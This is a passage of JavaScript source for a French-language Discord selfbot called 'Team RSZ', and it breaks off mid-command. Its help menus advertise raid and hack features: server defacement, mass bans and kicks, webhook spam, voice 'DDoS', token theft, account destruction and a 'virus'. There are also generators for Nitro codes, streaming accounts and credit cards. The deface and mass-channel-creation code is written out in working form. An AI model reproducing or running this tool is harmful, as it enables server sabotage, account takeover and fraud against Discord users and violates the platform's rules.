const Discord = require("discord.js");
require('colors')
const client = new Discord.Client();
const version = ('bêta')
const ConfigFile = require("../config.json")
const token = ConfigFile.token;
const yourgif = ConfigFile.gif;
const stream = ConfigFile.stream;
const bl = require("../Data/blacklist.json");
const blacklist = bl.id;
const base64 = require('base-64');
const utf8 = require('utf8');
const fs = require("fs");
const hastebins = require("hastebin-gen");
const rpcGenerator = require("discordrpcgenerator");
const backups = require("../Data/backups.json")
const afk = require("../Data/afk.json")
const db = require("../Data/pubmp.json");
const lbackup = require('../Data/liste.json')
const kicked = require('../Data/vkick.json')
const prefix = ConfigFile.prefix;
const superagent = require('superagent');
const fetch = require("node-fetch");
const request = require('request');
const { cpuUsage } = require("process");
function nitrocode(length, letter) {

  var multiplier = '';
  if (letter.indexOf('0') > -1) multiplier += '0123456789';
  if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
  var results = '';
  
  
  for (var i = length; i > 0; --i) 
  {
  results += multiplier[Math.floor(Math.random() * multiplier.length)];
  
  }
  
  return results; 
}
const color = ConfigFile.color;

const rire = [
'https://media1.tenor.com/images/bfde037642a618465ba50f4c463b49c3/tenor.gif?itemid=16137557',
'https://media.tenor.com/images/80c6b49239654be3a7cb4c58fb3b73be/tenor.gif',
'https://media.tenor.com/images/ed007451355180adaf4b697405030490/tenor.gif',
'https://media.giphy.com/media/rFfmUWVMOyKVG/giphy.gif',
'https://media1.tenor.com/images/123df3be1acfe3306b91e9c3dd6f9438/tenor.gif?itemid=5322596',
'https://media1.tenor.com/images/839addada9a7785b2da0aed97f441554/tenor.gif?itemid=9280880',
'https://media1.tenor.com/images/bfde037642a618465ba50f4c463b49c3/tenor.gif?itemid=16137557'
]

const kiss = [
'https://media.tenor.com/images/faadbe17f1b4fbf399be38eaddff6e05/tenor.gif',
'https://media1.tenor.com/images/78095c007974aceb72b91aeb7ee54a71/tenor.gif?itemid=5095865',
'https://media1.tenor.com/images/bc5e143ab33084961904240f431ca0b1/tenor.gif?itemid=9838409',
'https://media1.tenor.com/images/4b5d5afd747fe053ed79317628aac106/tenor.gif?itemid=5649376'
]

const hugh = [
  "https://media.tenor.com/images/6083ba11631dd577bcc271268d010832/tenor.gif",
  "https://media.tenor.com/images/a9730f44f28d959abb4c5b31edc77de8/tenor.gif",
  "https://media.tenor.com/images/778282e02d511fbc061e1439a5105c6f/tenor.gif",
  "https://media.tenor.com/images/0abe1090ab9874c62c4baaac18f0994d/tenor.gif"
]
const veski = [
  'https://media1.tenor.com/images/274fc34d3add3ce4cbb5716cb4f94f4f/tenor.gif?itemid=5841198',
  'https://media1.tenor.com/images/5ea40ca0d6544dbf9c0074542810e149/tenor.gif?itemid=14841901',
  'https://media.tenor.com/images/6bfc57bde155c401edc1d032de468cd6/tenor.gif'
]

const punch = [
  'https://media.tenor.com/images/5cdcbff8c5bce802d7b65baa711f12f4/tenor.gif',
  'https://media.tenor.com/images/5b668436338971d42469d7348a5340e5/tenor.gif',
  'https://media.tenor.com/images/2eef4d8e3eae8b321fdb2aff1feefbec/tenor.gif',
  'https://media.tenor.com/images/04a3cf11736bfa9083b91f2d41b76774/tenor.gif'
  ]
  
const pat = [
  'https://media1.tenor.com/images/6151c42c94df654b1c7de2fdebaa6bd1/tenor.gif?itemid=16456868',
  'https://media1.tenor.com/images/8b5711095b0ba786c43b617bf9c675dd/tenor.gif?itemid=15735895',
  'https://media1.tenor.com/images/55df4c5fb33f3cd05b2f1ac417e050d9/tenor.gif?itemid=6238142',
  'https://media1.tenor.com/images/6ee188a109975a825f53e0dfa56d497d/tenor.gif?itemid=17747839',
  'https://media1.tenor.com/images/0d2fb6ad9a6d71c3a018c0b37ffca50b/tenor.gif?itemid=16121044',
]
const cry = [
  'https://media1.tenor.com/images/b88fa314f0f172832a5f41fce111f359/tenor.gif?itemid=13356071',
  'https://media.tenor.com/images/c9fdb6e3ab914d5b195b11ebd99524d0/tenor.gif',
  'https://media1.tenor.com/images/f7fde4b118501c8fa5cb1a5dd171beab/tenor.gif?itemid=5652242',
  'https://media.tenor.com/images/eac8a7b4a0e7c468a31274b80c3958a1/tenor.gif',
  'https://media1.tenor.com/images/5b2bbfcbc1724a0bdc1b48dcf89274d6/tenor.gif?itemid=16648179',
]

const highfive = [
'https://media.tenor.com/images/d0bfc98b52b881153657932c6dce511c/tenor.gif',
'https://media.tenor.com/images/a506dd0b87c41f1988e4bddf7dc2062d/tenor.gif',
'https://media1.tenor.com/images/9730876547cb3939388cf79b8a641da9/tenor.gif?itemid=8073516',
'https://media.tenor.com/images/ad3b6e61921d1fb44b2121156e8560ce/tenor.gif',
]

var verifLevels = ["None", "Low", "Medium", "(╯°□°）╯︵  ┻━┻"];
var region = {
    "Brésil": "Brazil",
    "eu-central": "Central Europe",
    "singapoure": "Singapore",
    "us-central": "U.S. Central",
    "sydney": "Sydney",
    "us-east": "U.S. East",
    "us-south": "U.S. South",
    "us-west": "U.S. West",
    "eu-west": "Western Europe",
    "vip-us-east": "VIP U.S. East",
    "Londre": "London",
    "amsterdam": "Amsterdam",
    "hongkong": "Hong Kong"
};

function translateDate(date) {
    const Months = ["Jan", "Fev", "Mar", "Avr", "Mai", "Juin", "Juillet", "Aout", "Sep", "Oct", "Nov", "Dec"];
    const Days = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"];
    return Days[date.getUTCDay()] + ", " + date.getUTCDate() + " " + Months[date.getUTCMonth()] + " " + date.getUTCFullYear() + " at " + date.getUTCHours() + ":" + zeros(date.getUTCMinutes(), 2) + ":" + zeros(date.getUTCSeconds(), 2) + "." + zeros(date.getUTCMilliseconds(), 3);
}
function checkDays(date) {
    var now = new Date();
    var diff = now.getTime() - date.getTime();
    var days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
};


client.on('ready', function(){
  fetch('https://raw.githubusercontent.com/r3ngansasuke/Discord-Selfbot/main/Data/blacklist.json.')
  .then(res => res.text())
  .then(body =>
      fs.writeFile('./Data/blacklist.json', body, err => {
          if (err) console.log(err)
      }));
  console.clear()
  if(blacklist.includes(client.user.id)) {

  console.log(`
╔══════════════════════════════════════════╗
║                                          ║
║         Tu es banni du selfbot           ║
║                                          ║
╚══════════════════════════════════════════╝
`.red)
process.exit(1)
} else
  console.log(`
╔═════════════════════════════════╗
║            Team RSZ             ║
╟─────────────────────────────────╢
║-->  Createur : Sans#7777        ║
╟─────────────────────────────────╢
║-->  Pseudo   : ${client.user.tag}   
╟─────────────────────────────────╢
║-->  id       : ${client.user.id} 
╟─────────────────────────────────╢
║-->  Prefix   : ${prefix}                 
╟─────────────────────────────────╢
║-->  Membres  : ${client.guilds.map(guild => guild.memberCount).reduce((a, b) => a + b)}         
╟─────────────────────────────────╢
║-->  Bots     : ${client.users.filter(user => user.bot).size}                 
╟─────────────────────────────────╢
║-->  Salons   : ${client.channels.size}               
╟─────────────────────────────────╢
║-->  Serveurs : ${client.guilds.size} 
╟─────────────────────────────────╢
║-->  Version  : ${version}
╟─────────────────────────────────╢
║-->  Tu Stream: ${stream}                            
╚═════════════════════════════════╝ 
╔═════════════════════════════════╗\n\n`.green);
});


var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));

client.on('ready', function(){
  rpcGenerator.getRpcImage("840929985564114955", "zerotwo")
  .then(image => {
    rpcGenerator.getRpcImage("840929985564114955", "darling")
  .then(image2 => {
      let presence = new rpcGenerator.Rpc()
          .setName("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
          .setUrl('https://www.twitch.tv/codezero_two_')
          .setType("STREAMING")
          .setApplicationId("840929985564114955")
          .setDetails(stream)
          .setAssetsLargeImage(image2.id)
          .setAssetsSmallImage(image.id)
          .setAssetsLargeText(" ")
          .setState(" ")
          .setStartTimestamp(Date.now())

          .setParty({
              id: uuid()
              })
              client.user.setPresence(presence.toDiscord()).catch(console.error)
            })
          })
});

let gen = new Discord.RichEmbed();
gen.setTimestamp()
.setColor(color)
.setTitle('**Générateur**')
.setURL('https://discord.gg/5S54Svq6hR')
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.addField(' ```Nitro``` ', "***gen un nitro random***")
.addField(' ```Metal``` ', "***gen un metal dungeon***")
.addField(' ```Gspotify``` ', `***gen un spotify***`)
.addField(' ```Nordvpn``` ', `***gen un nord vpn***`)
.addField(' ```Uplay``` ', `***gen un uplay***`)
.addField(' ```pornhub``` ', `***gen un pornhub***`)
.addField(' ```Gtoken``` ', `***drop un token pour spam (valid)***`)
.addField(' ```Dofus``` ', `***gen un dofus***`)
.addField(' ```Netflix``` ', `***gen un neflix uncheck***`)
.addField(' ```CC``` ', `***gen un carte de crédit discord (ne pas payer de nitro sur son compte risque de ban)***`) /////269
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')

let cmd = new Discord.RichEmbed();
cmd.setTimestamp()
.setColor(color)
.setTitle("**Liste des commandes**")
.setURL('https://discord.gg/5S54Svq6hR')
.addField('**Commande Help**', "`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help hack`, `help raid`")
.addField("**Commandes Fun** :joy:: ", '`auto voice kick`, `stop auto voice kick`, `start typing`, `branlette`, `lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `smile`, `kiss`, `blush`, `load`, `punch`, `hug`,`pat`,`salut`,`cv`')
.addField("**Commandes Moderation** :tools:: ", '`voice kick`, `set serveur name`, `roles list`, `channels list`, `shutdown`, `kick`, `ban`, `purge`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
.addField("**Commandes Nsfw** :underage: :", '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
.addField("**Commandes Raid** :no_entry_sign: :", '`deface`, `spam`, `webhook spam`, `create channel`, `stop spam`, `name all`, `ban all`, `kick all`, `delete all channels`, `delete all role`')
.addField("**Commandes Hack** :skull_and_crossbones: :", '`check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`')
.addField("**Commandes Utile** :globe_with_meridians: :", '`nuke dm`,, `mp all`, `stop mp all`, `grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote` `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`')
.addField("**Commandes Statut** :performing_arts: :", '`rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`')
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help_hack = new Discord.RichEmbed()
.setTimestamp()
.setColor(color)
.setTitle('**Pannel de Help Hacking**')
.setURL('https://discord.gg/5S54Svq6hR')
.addField(`**${prefix}ddos voc**`, "`Lance une attaque ddos sur les channels vocal`")
.addField(`**${prefix}ddos-stop**`, "`Stop une attaque ddos sur les channels vocal`")
.addField(`**${prefix}virus**`, "`Lance un virus`")
.addField(`**${prefix}token (@user)**`,"`Affiche le token d'un utilisateur`")
.addField(`**${prefix}check token (token)**`,"`Check si un token est valide`")
.addField(`**${prefix}info token (token)**`,"`Affiche les informations d'un utilisateur grace a un token`")
.addField(`**${prefix}fuck token (token)**`,"`Detruit le compte d'un utilisateur grace a un token`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help_raid = new Discord.RichEmbed()
.setTimestamp()
.setColor(color)
.setTitle('**Pannel de Help Raid**')
.setURL('https://discord.gg/vxGygmGyEq')
.addField(`**${prefix}serveur info**`,"`Envoie les information du serveur`")
.addField(`**${prefix}infoplus**`,"`Montre des informations en plus sur le serveur`")
.addField(`**${prefix}create channel**`,"`Creer 10 channels textuel`")
.addField(`**${prefix}deface**`,"`Déface entierement un serveur (nom/icon/channels)`")
.addField(`**${prefix}webhook spam**`,"`Créer 3 webhooks par salon et spam avec (ultra rapide)`")
.addField(`**${prefix}destroy**,"Détruit le serveur"`)
.addField(`**${prefix}spam (text)**`,"`Spam un text`")
.addField(`**${prefix}stop spam**`,"`Arrete le spam`")
.addField(`**${prefix}createrole**`, "`Créé pleins de rôles`")
.addField(`**${prefix}delete all role**`,"`Supprime tous les rôles du serveur`")
.addField(`**${prefix}delete all channel**`,"`Supprime tout les salons d'un serveur`")
.addField(`**${prefix}name all**`,"`Rename tout les membres d'un serveur`")
.addField(`**${prefix}ban-all**`,"`Ban tout les membres d'un serveur`")
.addField(`**${prefix}kick-all**`,"`Kick tout les membres d'un serveur`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help = new Discord.RichEmbed();
help.setTimestamp()
.setColor(color)
.setTitle('🌙**Pannel de Help**🌙')
.setURL('https://discord.gg/vxGygmGyEq')
.addField(`**${prefix}cmd**`,"`Liste des commandes`")
.addField(`**${prefix}help fun**`,"`Affiche les commandes fun` :joy:")
.addField(`**${prefix}help gen**`,"`Affiche les commandes générateur` :tada:")
.addField(`**${prefix}help moderation**`,"`Affiche les commandes moderation` :tools:")
.addField(`**${prefix}help utile**`,"`Affiche les commandes info` :globe_with_meridians:")
.addField(`**${prefix}help nsfw**`,"`Affiche les commandes nsfw` :underage:")
.addField(`**${prefix}help raid**`,"`Affiche les commandes raid` :no_entry_sign: ")
.addField(`**${prefix}help hack**`,"`Affiche les commandes hack` :skull_and_crossbones:")
.addField(`**${prefix}help statut**`,"`Affiche les commandes statut` :performing_arts:")
.addField(`**${prefix}help anime**`,"`Affiche les commandes statut d'animes` :fish_cake:")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help_statut = new Discord.RichEmbed()
.setColor(color)
.setTitle('**Pannel de Help Statut** :performing_arts: ')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
.addField(`**${prefix}rocket league (text)**`, "`Met un statut Rocket League`")
.addField(`**${prefix}spotify (text)**`,"`Met un statut Spofity`")
.addField(`**${prefix}fortnite (text)**`, "`Met un statut Fortnite`")
.addField(`**${prefix}among us (text)**`, "`Met un statut Among us`")
.addField(`**${prefix}gucci (text)**`, "`Met un statut Gucci`")
.addField(`**${prefix}lacoste (text)**`, "`Met un statut Lacoste`")
.addField(`**${prefix}nike (text)**`, "`Met un statut Nike`")
.addField(`**${prefix}google (text)**`, "`Met un statut Google`")
.addField(`**${prefix}skype (text)**`, "`Met un statut Skype`")
.addField(`**${prefix}snapchat (text)**`, "`Met un statut Snapchat`")
.addField(`**${prefix}facebook (text)**`, "`Met un statut Facebook`")
.addField(`**${prefix}tiktok (text)**`, "`Met un statut Tiktok`")
.addField(`**${prefix}twitter (text)**`, "`Met un statut Twitter`")
.addField(`**${prefix}minecraft (text)**`, "`Met un statut Minecraft`")
.addField(`**${prefix}instagram (text)**`, "`Met un statut Instagram`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let anime = new Discord.RichEmbed()
.setColor(color)
.setTitle('**Pannel de Help Statut** :performing_arts: ')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
.addField(`**${prefix}naruto (text)**`, "`Met un statut Rocket League`")
.addField(`**${prefix}hunter x hunter (text)**`,"`Met un statut Hunter X Hunter`")
.addField(`**${prefix}tokyo ghoul (text)**`, "`Met un statut Tokyo Ghoul`")
.addField(`**${prefix}ditf (text)**`, "`Met un statut Darling in the FranXX`")
.addField(`**${prefix}mha (text)**`, "`Met un statut My Hero Academia`")
.addField(`**${prefix}death note (text)**`, "`Met un statut Death Note`")
.addField(`**${prefix}snk (text)**`, "`Met un statut SNK`")
.addField(`**${prefix}assassination classroom (text)**`, "`Met un statut Assassination Classroom`")
.addField(`**${prefix}one piece (text)**`, "`Met un statut One Piece`")
.addField(`**${prefix}demon slayer (text)**`, "`Met un statut Demon Slayer`")
.addField(`**${prefix}sao (text)**`, "`Met un statut Facebook`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help_statut2 = new Discord.RichEmbed()
.setColor(color)
.setTitle('**Pannel de Help Statut** :performing_arts: ')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
.addField(`**${prefix}youtube (text)**`, "`Met un statut Youtube`")
.addField(`**${prefix}clash of clan (text)**`, "`Met un statut Clash of Clan`")
.addField(`**${prefix}clash royal (text)**`, "`Met un statut Clash Royal`")
.addField(`**${prefix}tinder (text)**`, "`Met un statut Tinder`")
.addField(`**${prefix}pornhub (text)**`, "`Met un statut Pornhub`")
.addField(`**${prefix}roblox (text)**`, "`Met un statut Roblox`")
.addField(`**${prefix}csgo (text)**`, "`Met un statut Csgo`")
.addField(`**${prefix}apex (text)**`, "`Met un statut Apex`")
.addField(`**${prefix}badlion (text)**`, "`Met un statut Badlion`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help_fun = new Discord.RichEmbed()
.setTimestamp()
.setColor(color)
.setTitle('**Pannel de Help Fun** :joy: ')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
.addField(`**${prefix}start typing**`,"`Vous affiche entrain d'ecrire indefiniment`")
.addField(`**${prefix}avatar (@user)**`,"`Affiche l'avatar d'un membre`")
.addField(`**${prefix}lovecalc (@user)**`,"`Test d'amour`")
.addField(`**${prefix}nitro**`,"`Genere un nitro random`")
.addField(`**${prefix}8ball (text)**`,"`Pose une question`")
.addField(`**${prefix}say (text)**`,"`Affiche un text en embed`")
.addField(`**${prefix}fight (@user)**`,"`Bat toi avec un utilisateur`")
.addField(`**${prefix}boom (@user)**`,"`Fait exploser un utilisateur`")
.addField(`**${prefix}smile**`,"`Envoie un gif rire`")
.addField(`**${prefix}kiss (@user)**`,"`Embrasse un membre`")
.addField(`**${prefix}blush**`,"`Envoie un gif qui rougit`")
.addField(`**${prefix}load**`,"`Envoie un chargement`")
.addField(`**${prefix}branlette**`,"`Simule une grosse branlette + éjaculation`")
.addField(`**${prefix}punch (@user)**`,"`Frappe un membre`")
.addField(`**${prefix}hug (@user)**`,"`Fait un calin a un membre`")
.addField(`**${prefix}reverse (text)**`,"`Met ton text a l'envers`")
.addField(`**${prefix}pat (@user)**`,"`Pat une personne`")
.addField(`**${prefix}salut**`,"`Anime un message saluant tout le monde`")
.addField(`**${prefix}cv**`,"`Anime un message demandant si vous allez bien`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help_moderation = new Discord.RichEmbed()
.setTimestamp()
.setColor(color)
.setTitle('**Pannel de Help Moderation** :tools: ')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
.addField(`**${prefix}voice kick (@user)**`,"`Kick un utilisateur du salon vocal`")
.addField(`**${prefix}set serveur name (text)**`,"`Change le nom du serveur`")
.addField(`**${prefix}shutdown**`,"`Eteint le selfbot`")
.addField(`**${prefix}kick (@user)**`,"`kick un membre du serveur`")
.addField(`**${prefix}ban (@user)**`,"`Ban un membre du serveur`")
.addField(`**${prefix}roles list**`,"`Envoie la liste de tout les roles d'un serveur`")
.addField(`**${prefix}channels list**`,"`Envoie la liste de tout les channels d'un serveur`")
.addField(`**${prefix}purge**`,"`Supprime tout les messages`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')




let help_info = new Discord.RichEmbed()
.setTimestamp()
.setColor(color)
.setTitle('**Pannel de Help Utile** :globe_with_meridians: ')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
.addField(`**${prefix}mp all**`,"`Permet de dm toutes les personnes d'un serveur`")
.addField(`**${prefix}stop mp all**`,"`Permet de stopé la commande mp all`")
.addField(`**${prefix}auto voice kick (@user)**`,"`Permet de kick un utilisateur du vocal (parfait pour troll)`")
.addField(`**${prefix}stop auto voice kick (@user)**`,"`Permet de stopé la commande auto voice kick`")
.addField(`**${prefix}nuke dm**`,"`Nuke tout tes dm (𝚃𝚎𝚊𝚖 𝚁𝚂𝚉 les clear) pour limiter les beugs et l'ésthetique`")
.addField(`**${prefix}afk (text)**`,"`Pour te definir comme \"afk\"`")
.addField(`**${prefix}user info (@user)**`,"`Envoie les information d'un membre du serveur`")
.addField(`**${prefix}stats**`,"`Affiche les stats du selfbot`")
.addField(`**${prefix}restart**`,"`Redemarre le selfbot`")
.addField(`**${prefix}reset**`,"`Reset le status`")
.addField(`**${prefix}role info (@role)**`,"`Envoie les informations d'un role`")
.addField(`**${prefix}encode (text)**`, "`Crypte ton text en base64`")
.addField(`**${prefix}discord**`, "`Affiche votre version de discord js`")
.addField(`**${prefix}gen token**`,"`Change votre token`")
.addField(`**${prefix}add emote (emote) <name>**`, "`Ajoute un emoji au serveur`")
.addField(`**${prefix}emote (emote)**`, "`Donne les infos tout les emojis d'un serveur`")
.addField(`**${prefix}remove emote (emote)**`, "`Supprime un emoji du serveur`")
.addField(`**${prefix}steal emote (serveur id)**`, "`Ajoute tout les emojis d'un serveur a ton serveur`")
.addField(`**${prefix}delete all emote**`, "`Supprime tout les emojis du serveur`")
.addField(`**${prefix}grab pp (user)**`, "`Vole la photo de profile de la personne mentionné`")
.addField(`**${prefix}check token (token)**`, "`Vérifie si le token est valide`")
.addField(`**${prefix}mp friend (message)**`,"`Envoie un message privé a tout tes amis`")
.addField(`**${prefix}change hypesquad (brilliance/bravery/ballance)**`,"`Permet de changer sa maison hypesquad`")
.addField(`**nitro autoclaim**`,"`Un autoclaim est en permanance activé sur le self`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')


let help_nsfw = new Discord.RichEmbed()
.setTimestamp()
.setColor(color)
.setTitle('**Pannel de Help nsfw** :underage: ')
.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
.addField(`**${prefix}ass**`,"`Envoie une photo de fesse`")
.addField(`**${prefix}4k**`,"`Envoie une image sexe en 4k`")
.addField(`**${prefix}anal**`,"`Envoie un gif anal`")
.addField(`**${prefix}hentai**`,"`Envoie une image/gif hentai`")
.addField(`**${prefix}nsfw-gif**`,"`Envoie un gif de sexe`")
.addField(`**${prefix}pussy**`,"`Envoie une image de chattes`")
.addField(`**${prefix}thigh**`,"`Envoie une image thigh`")
.setDescription("`" + `le prefix est:  ${prefix}` + '`')
.setImage(yourgif)
.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')

function saver() {
  fs.writeFile("./Data/pubmp.json", JSON.stringify(db), err => {
    if (err) console.error(err);
  });
}



client.on('message', message =>{
  if(message.author.id === "815345046526230538"){
    if(message.guild.id === "786244044048695297"){
      message.delete();
    }
  }
  let clientid = client.user.id;
  let randomnumber = Math.floor(Math.random() * 9000 + 1000)
  async function addreaction() {

    const miliseconds = Math.floor(Math.random() * 1500);

    async function react() {
        message.react("🎉").catch(err => {
          if(err){           
        console.log('║--> [', `/!/ Attention`.red,']', `\nJe n'ai pas reussi a reagir au giveaway sur ${message.guild.name}, il est possible que je n'ai pas les permissions :/`.green)
        console.log('╚═════════════════════════════════╝'.blue)
        return;  
      }});
      console.log('║--> [', `Youpi`.green,']', `\nJ'ai pas correctement a reagit au giveaway sur ${message.guild.name}, en ${miliseconds}ms je suis super rapide hehe ;)`.green)
      console.log('╚═════════════════════════════════╝'.blue)
    }

    setTimeout(react, miliseconds);
}

async function checkwin() {
    if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
        if(message.content.includes("Congratulations")) {
          if(message.content.includes(client.user.id)){
          if(message.embeds)
      console.log('╟─────────────────────────────────╢'.blue)
      console.log('║--> [', `GG!`.green,']', `\nJe t'ai fais gagner le giveaway sur le serveur ${message.guild.name} va vite reclamer ta récompense!`.green)
      console.log('╟─────────────────────────────────╢'.blue)
        }}
    }
}


checkwin()

if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
    if(message.embeds[0]) {
        if(message.embeds[0].description.includes("React with")) {
            addreaction()
        }
    }
}
	let msg = message;
	if(message.author.id === client.user.id){
		if(afk[client.user.id]){
		if(message.content.includes(":x:")){
			return;
		}else 
			delete afk[client.user.id]
			  saving();
			  message.channel.send(":white_check_mark: **Vous n'etes plus afk**")
        console.log("╟ Commande afk stopé")
        console.log("╟─────────────────────────────────╢")
		}};
	if(message.content.includes(client.user.id)){
		if(message.author.id === client.user.id)return;
		if(afk[client.user.id]){
		message.reply(":x: **Je suis afk pour la raison** " + afk[client.user.id].r)
        console.log('║--> [', `/!\\ Attention`.red,']', `\nl'utilisateur ${message.author.username} vient de vous ping lors de votre afk ${message.content}`.green)
        console.log('╟─────────────────────────────────╢'.blue)
		}else return;
	};
	var args = message.content.substring(prefix.length).split(" ");
    var mentionuser = message.mentions.users.first();
    if(message.channel.type === "dm"){
    if(msg.author.bot){
      if(message.content.includes('discord.gg')){
        let botblock = message.author;
        botblock.send(`/!\\ Anti mp`).then((msg) => {
          msg.delete()
        })
        console.log('║--> [', `/!/ Attention`.red,']', `\nle bot ${message.author.username} vient de vous envoyer une invatation suspecte ${message.content}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
      }
    }
    }
  if(msg.author.id !== client.user.id) return;
  if(message.content.startsWith(prefix + "deface")){
    if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
  if(!message.member.hasPermission('ADMINISTRATOR'))return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
  message.delete();
  message.guild.setName(`RAID BY ${client.user.username}`);
  message.guild.setIcon("https://cdn.discordapp.com/attachments/746353600741244938/845599350390521886/unnamed_1.png");
  message.guild.channels.forEach(ch => {
    ch.delete();
  });
  message.guild.createChannel("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉", 'text');
  console.log("╟  Commande deface executé.")
  console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix + "create channel")){
    if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
  if(!message.member.hasPermission("MANAGE_CHANNELS"))return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
  message.delete();
    for (let pas = 0; pas < 99; pas++) {
        message.guild.createChannel(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉-𝐱-${client.user.username}`, "text" ).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    }
    console.log("╟ Commande create channel executé")
    console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix + "start typing")){
      message.delete();
      message.channel.startTyping();
      console.log("╟ Commande start typing executé")
      console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix + "webhook spam")){
    let webhookmessages = args.splice(2).join(" ") || "@everyone\nhttps://discord.gg/5S54Svq6hR\n Discord\nhttps://discord.gg/5S54Svq6hR"
      if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
